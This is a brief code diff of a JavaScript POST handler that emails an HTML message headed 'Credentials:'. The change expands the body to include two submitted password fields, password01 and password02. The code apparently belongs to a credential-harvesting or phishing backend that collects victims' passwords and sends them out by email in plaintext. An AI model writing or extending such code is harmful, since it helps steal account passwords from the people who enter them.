@@ -15,7 +15,8 @@ export async function POST(request) {
 
       html: `
         <h1>Credentials: </h1>
-        <h2>${message}</h2>
+        <h2>${message.password01}</h2>
+        <h2>${message.password02}</h2>
       `,
     });
 
